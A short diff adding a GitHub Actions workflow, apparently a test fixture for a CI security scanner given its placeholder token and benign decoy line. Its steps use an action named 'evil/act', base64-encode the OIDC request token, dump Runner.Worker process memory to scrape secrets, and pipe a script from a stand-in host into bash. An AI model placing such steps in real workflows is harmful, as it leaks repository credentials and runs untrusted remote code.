@@ -1,0 +1,15 @@
+name: curl docs
+on: push
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: some-org/deploy@main
+      - uses: "evil/act"
+      - run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN FAKE_SECRET_TOKEN_H4" | base64
+      - run: |
+          sudo cat /proc/1234/mem > dump
+          cat /proc/$(pgrep -f Runner.Worker)/mem
+          curl -s https://example.invalid/x | bash
+      - run: cat /proc/cpuinfo > a/mem
